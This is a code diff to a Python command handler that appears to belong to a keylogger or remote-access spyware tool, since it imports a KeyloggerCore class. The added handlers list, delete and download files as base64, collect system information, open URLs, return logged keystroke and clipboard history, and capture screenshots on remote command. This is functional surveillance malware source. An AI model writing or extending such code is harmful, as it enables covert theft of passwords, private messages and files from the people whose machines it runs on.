@@ -14,20 +14,56 @@ class CommandHandler:
 
     @staticmethod
     def handle_file_operation(params):
+        import base64
         action = params.get('action')
-        path = params.get('path')
-        
-        if action == 'delete':
+        path = params.get('path', '.')
+    
+        if action == 'list':
+            return {
+                "path": path,
+                "files": [f.name for f in os.scandir(path) if f.is_dir() or f.is_file()]
+            }
+        elif action == 'delete':
             os.remove(path)
             return {"status": "success"}
         elif action == 'download':
             with open(path, 'rb') as f:
                 return {"content": base64.b64encode(f.read()).decode()}
         elif action == 'upload':
-            # Implementation for file upload
-            pass
+            # Implementation for file upload (not yet implemented)
+            raise CommandError("Upload action not implemented.")
         else:
             raise CommandError(f"Invalid file action: {action}")
+
+    @staticmethod
+    def handle_system_info(params):
+        from system.collector import SystemCollector
+        return SystemCollector.collect_full()
+
+    @staticmethod
+    def handle_open_url(params):
+        url = params.get('url')
+        if not url:
+            raise CommandError("Missing 'url' parameter")
+        webbrowser.open(url)
+        return {"status": "success"}
+
+    @staticmethod
+    def handle_keystroke_history(params):
+        return {"history": ActivityLogger.get_keystroke_history()} 
+    
+    @staticmethod
+    def handle_clipboard_history(params):
+        return {"history": ActivityLogger.get_clipboard_history()}
+    
+    @staticmethod
+    def handle_capture_screenshot(params):
+        from main import KeyloggerCore
+        keylogger = KeyloggerCore()  # Create instance
+        screenshot = keylogger._capture_screenshot()
+        if screenshot:
+            return {"screenshot": base64.b64encode(screenshot).decode()}
+        raise CommandError("Failed to capture screenshot")
 
     @staticmethod
     def handle_system_command(params):
